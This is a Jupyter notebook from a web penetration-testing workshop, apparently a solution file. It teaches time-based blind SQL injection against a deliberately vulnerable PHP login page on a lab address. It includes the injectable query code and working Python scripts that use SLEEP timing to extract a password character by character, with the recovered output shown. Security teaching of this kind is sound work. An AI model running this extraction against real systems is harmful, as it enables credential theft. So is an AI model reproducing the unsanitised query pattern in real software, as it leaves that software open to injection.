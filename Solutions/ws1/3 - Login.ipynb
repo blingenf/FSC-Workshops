{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# WORKSHOP 1: Web Penetration Testing 1\n",
    "## Part three: timing injection\n",
    "This is the last injection-based attack. Again, we'll be attacking a server running PHP and MySQL. This attack is very similar to the blind attack, so let's take care of this quickly.\n",
    "\n",
    "Here's the webpage, as usual:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "        <iframe\n",
       "            width=\"100%\"\n",
       "            height=\"400\"\n",
       "            src=\"http://172.16.4.60/ws1/login.php\"\n",
       "            frameborder=\"0\"\n",
       "            allowfullscreen\n",
       "        ></iframe>\n",
       "        "
      ],
      "text/plain": [
       "<IPython.lib.display.IFrame at 0x7f67906bf208>"
      ]
     },
     "execution_count": 1,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from IPython.display import IFrame, HTML\n",
    "\n",
    "# I'm declaring URL as a global variable because the workshop\n",
    "# is located on a local IP which is subject to change.\n",
    "# Make sure you run this code first to declare the variable.\n",
    "URL = 'http://172.16.4.60/ws1/login.php'\n",
    "\n",
    "IFrame(URL, width='100%', height=400)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Analysis\n",
    "\n",
    "As indicated by the warning message, there's no apparent response to anything you type into the box. You can inject all you want, the only thing that will every show up is \"login failed\". So, game over, right? There's nothing we can possibly get from the response text.\n",
    "\n",
    "Maybe there's something we're missing. Let's look at the PHP code again:\n",
    "```PHP\n",
    "\\$link = mysqli_connect(\"127.0.0.1\",\"ws1login\",\"<password>\",\"workshop1\");\n",
    "\\$username = \\$_POST[\"username\"];\n",
    "\\$password = \\$_POST[\"password\"];\n",
    "\\$query = \"select * from users3 where username ='\" . \\$username . \"' and password = '\" . \\$password . \"';\";\n",
    "\\$result = \\$link->query(\\$query);\n",
    "if (mysqli_num_rows(\\$result) == 0) {\n",
    "    echo \"<h2>login failed</h2>\";\n",
    "}\n",
    "else {\n",
    "    echo \"<h2>login failed</h2>\";\n",
    "}\n",
    "mysqli_close(\\$link);\n",
    "```\n",
    "(Note: the \\\\\\$ are due to issues with Jupyter code markdown and MathJax. The actual code has no backslashes)\n",
    "    \n",
    "Looks like the usual. Unfortunately, it looks like the developer (me) was lazy and just added a login failed statement instead of real login code. So, either I'm a nihlist or there's some way to extract information without any help from the response text."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Attack\n",
    "Well, I may be a nihlist but this particular workshop does have a solution. There's one last SQL concept I need to introduce, the `SLEEP` statement. This can be inserted in an ordinary query like so:\n",
    "```MySQL\n",
    "SELECT * FROM users WHERE password LIKE BINARY \"pass%\" AND SLEEP(1);\n",
    "```\n",
    "If you're familiar with how `if` statements are evaluated in language like C and python, you may see where I'm going with this. SQL uses what's called short-circuit evaluation: if it can find the answer to a conditional statement early on, it doesn't bother checking the rest of the statement. For example, in the following statement:\n",
    "```MySQL\n",
    "SELECT * FROM users WHERE username=\"bob\" AND password=\"bobspassword\";\n",
    "```\n",
    "If there isn't any user named bob, MySQL won't bother looking at passwords; it already knows the query won't return anything, so it stops. The same applies to this statement:\n",
    "```MySQL\n",
    "SELECT * FROM users WHERE username=\"bob\" AND SLEEP(1);\n",
    "```\n",
    "It may seem weird that we're putting a delay in a conditional statement, but this works the same as the above. If there's no user named bob, SQL will short circuit the query and there will be no delay. If there is a user named bob, SQL won't short circuit and there will be a 1 second delay. I've put the python code below: you should stop here before looking at it and think about how we can use this behavior to do the same thing we did in part two."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "w\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "possible_chars = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890\"\n",
    "\n",
    "for char in possible_chars:\n",
    "    password_guess = char\n",
    "    payload = {\"username\" : \"FLAG' AND password LIKE BINARY '\" + password_guess + \"%' AND SLEEP(0.5); #\",\n",
    "               \"password\" : \"blah\"}\n",
    "\n",
    "    response = requests.post(URL, data=payload)\n",
    "    if response.elapsed.total_seconds() > 0.5:\n",
    "        print(password_guess)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "As I hope you've noticed, we're now in the exact same situation as part two. All I did was add `AND SLEEP(0.5)` to the query and change the condition to `response.elapsed.total_seconds() > 0.5`. Let's copy the code over from part two, with those two modifications."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "w\n",
      "w5\n",
      "w5M\n",
      "w5Ml\n",
      "w5Mlj\n",
      "w5Mljl\n",
      "w5MljlL\n",
      "w5MljlLk\n",
      "w5MljlLk1\n",
      "w5MljlLk1c\n",
      "w5MljlLk1cK\n",
      "w5MljlLk1cK8\n",
      "w5MljlLk1cK8O\n",
      "w5MljlLk1cK8OT\n",
      "w5MljlLk1cK8OTK\n",
      "w5MljlLk1cK8OTKM\n"
     ]
    }
   ],
   "source": [
    "password_guess = \"\"\n",
    "\n",
    "while True:\n",
    "    new_character = False\n",
    "    for char in possible_chars:\n",
    "        payload = {\"username\" : \"FLAG' AND password LIKE BINARY '\" + password_guess + char + \"%' AND SLEEP(0.5); #\",\n",
    "                   \"password\" : \"blah\"}\n",
    "        \n",
    "        response = requests.post(URL, data=payload)\n",
    "        if response.elapsed.total_seconds() > 0.5:\n",
    "            password_guess = password_guess + char\n",
    "            print(password_guess)\n",
    "            new_character = True\n",
    "    \n",
    "    if not new_character:\n",
    "        break"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "And there it is! A little slower than last time, but it works almost the same way.\n",
    "\n",
    "Feel free to push down the sleep duration as much as you can; I left it at a fairly high value to avoid any errors, but you can speed things up pretty significantly if you have a good connection. When timing attacks are going through the internet, the process gets a little more complicated because the timing won't be as consistent. With some patience, however, this attack will always work.\n",
    "\n",
    "Again, all you have to do to defend against this is sanitize all inputs. I hope through the first three parts of this workshop you've realized how devastating allowing any kind of injection can be!"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
